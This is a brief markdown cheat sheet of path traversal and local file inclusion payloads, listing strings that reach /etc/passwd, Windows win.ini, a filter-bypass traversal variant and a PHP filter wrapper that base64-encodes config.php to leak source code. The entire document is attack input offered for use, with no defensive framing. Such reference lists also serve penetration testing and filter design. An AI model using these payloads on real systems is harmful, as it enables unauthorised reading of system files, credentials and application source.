# Common Payloads

| Payload | Target |
|---------|--------|
| `../../../etc/passwd` | Linux password file |
| `..\..\..\..\windows\win.ini` | Windows INI file |
| `....//....//....//etc/passwd` | Bypass simple filter |
| `/etc/passwd` | Absolute path |
| `php://filter/convert.base64-encode/resource=config.php` | Source code |